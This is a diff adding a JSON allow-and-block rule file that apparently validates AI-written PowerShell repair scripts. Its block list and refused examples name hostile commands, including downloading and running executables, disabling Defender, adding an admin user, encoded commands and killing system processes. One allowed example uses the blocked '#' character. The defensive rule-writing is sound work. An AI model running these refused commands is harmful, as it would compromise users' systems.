@@ -1,0 +1,72 @@
+{
+  "about": "What an AI-written PowerShell fix may contain. The same file is in app/core/script_rules.json (a server test checks they match); the server and the agent both refuse anything else. Read the checker (check.go / script_check.py) for how each list is used.",
+  "max_chars": 3000,
+  "max_lines": 30,
+  "allowed_commands": [
+    "get-process", "get-service", "start-service", "restart-service",
+    "get-ciminstance", "get-childitem", "get-item", "get-itemproperty", "get-volume", "get-psdrive",
+    "get-disk", "get-physicaldisk", "get-storagereliabilitycounter", "optimize-volume", "repair-volume",
+    "get-netadapter", "restart-netadapter", "get-netipconfiguration", "get-dnsclientcache", "clear-dnsclientcache",
+    "test-connection", "test-netconnection", "resolve-dnsname",
+    "get-mpcomputerstatus", "get-mpthreat", "get-mpthreatdetection", "start-mpscan", "update-mpsignature", "remove-mpthreat",
+    "get-counter", "get-date", "get-winevent", "get-hotfix", "get-computerinfo", "get-scheduledtask",
+    "select-object", "sort-object", "where-object", "foreach-object", "format-table", "format-list",
+    "measure-object", "group-object", "write-output", "out-string", "start-sleep",
+    "powercfg", "sfc", "dism", "chkdsk", "ipconfig", "defrag", "tasklist", "systeminfo", "ping", "nslookup", "getmac", "hostname"
+  ],
+  "read_only_prefixes": [
+    "get-", "select-", "sort-", "where-", "foreach-", "format-", "measure-", "group-", "write-", "out-",
+    "test-", "resolve-", "start-sleep", "ipconfig", "tasklist", "systeminfo", "ping", "nslookup", "getmac", "hostname"
+  ],
+  "keywords": [
+    "if", "elseif", "else", "foreach", "for", "while", "do", "try", "catch", "finally",
+    "return", "break", "continue", "throw", "in", "switch"
+  ],
+  "blocked_text": [
+    "]::", "scriptblock", "frombase64", "encodedcommand", "downloadstring", "downloadfile", "system.net", "net.webclient",
+    "http:", "https:", "ftp:", "\\\\", ".invoke(", "-comobject", "invoke-", "add-type", "new-object",
+    "mppreference", "disablerealtime", "exclusionpath", "exclusionprocess", "tamperprotection",
+    "windefend", "wdnissvc", "securityhealth", "msmpeng", "lsass", "csrss", "wininit", "winlogon", "smss",
+    "stop-process", "taskkill", "lectio", "currentversion\\run", "start menu\\programs\\startup", "executionpolicy", "enablelua",
+    "fdenytsconnections", "set-", "remove-item", "clear-eventlog", "wevtutil", "vssadmin", "bcdedit"
+  ],
+  "blocked_characters": ["`", "&", "#", "<", ">", "@"],
+  "examples": {
+    "allowed": [
+      "Get-Process | Sort-Object CPU -Descending | Select-Object -First 5 Name, Id, CPU",
+      "$p = Get-Process -Name chrome -ErrorAction SilentlyContinue\nforeach ($x in $p) { $x.PriorityClass = 'BelowNormal' }\nWrite-Output 'Lowered the priority of Chrome'",
+      "# Switch to the Balanced power plan\npowercfg /setactive 381b4222-f694-41f0-9685-ff5bb260df2e",
+      "Clear-DnsClientCache\nipconfig /flushdns",
+      "Restart-Service -Name Spooler\nGet-Service Spooler | Select-Object Status",
+      "dism /Online /Cleanup-Image /RestoreHealth",
+      "Start-MpScan -ScanType QuickScan",
+      "if ((Get-Volume -DriveLetter C).SizeRemaining -lt 10GB) { Write-Output 'Drive C is almost full' }"
+    ],
+    "refused": [
+      "iex (Get-Content x.txt)",
+      "Invoke-Expression 'whoami'",
+      "Set-MpPreference -DisableRealtimeMonitoring $true",
+      "Add-MpPreference -ExclusionPath C:\\",
+      "Invoke-WebRequest https://example.com/x.exe -OutFile x.exe",
+      "(New-Object Net.WebClient).DownloadString('http://x')",
+      "& 'C:\\evil.exe'",
+      "Start-Process notepad",
+      "net user hacker P4ss /add",
+      "Remove-Item C:\\Windows -Recurse",
+      "evil.exe /quiet",
+      "powershell -enc ZQBjAGgAbwA=",
+      "cmd /c del C:\\x",
+      "Get-Process | ForEach-Object { iex $_.Name }",
+      "Get-Process lsass | Stop-Process",
+      "Get-Process | Sort-Object WorkingSet -Descending | Select-Object -First 1 | Stop-Process -Force",
+      "Stop-Service LectioAgent",
+      "[System.Diagnostics.Process]::Start('calc')",
+      "Get-Process `\n| Stop-Process",
+      "Get-Process <# hidden #> | Stop-Process",
+      "Write-Output 'unterminated",
+      "Register-ScheduledTask -TaskName x",
+      ". ./evil.ps1",
+      "$x = 'i' + 'ex'; . $x"
+    ]
+  }
+}
